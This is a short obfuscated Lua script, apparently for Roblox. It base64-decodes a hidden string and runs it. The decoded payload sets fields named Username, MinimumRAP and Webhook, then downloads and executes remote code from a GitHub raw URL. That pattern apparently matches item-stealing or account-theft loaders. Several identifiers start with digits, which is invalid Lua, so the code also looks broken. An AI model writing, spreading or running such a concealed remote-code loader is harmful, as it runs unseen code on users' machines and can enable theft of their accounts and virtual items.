
    local 6ui7j5qcjn6 = "CiAgICAgIFVzZXJuYW1lID0gImRmcmVnIgogICAgICBVc2VybmFtZTIgPSAicmVncmUiCiAgICAgIE1pbmltdW1SQVAgPSAiMzI0MzIiCiAgICAgIFdlYmhvb2sgPSAicmVncmUiCgogICAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tLzIxNEVsaS8yMTRzY3JpcHRzL3JlZnMvaGVhZHMvbWFpbi8yMTRzY3JpcHRzIiwgdHJ1ZSkpKCk="
    local function 719mn8x04p(str)
      local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
      str=string.gsub(str,'[^'..b..'=]','')
      return (str:gsub('.',function(x) if(x=='=')then return''end local r,f='',(b:find(x)-1)for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0and'1'or'0')end return r;end):gsub('%d%d%d?%d?%d?%d?%d?%d?',function(x) if(#x~=8)then return''end local c=0 for i=1,8 do c=c+(x:sub(i,i)=='1'and 2^(8-i)or 0)end return string.char(c)end))
    end
    local 9vejk2nxui=function() loadstring(719mn8x04p(6ui7j5qcjn6))() end
    9vejk2nxui()
  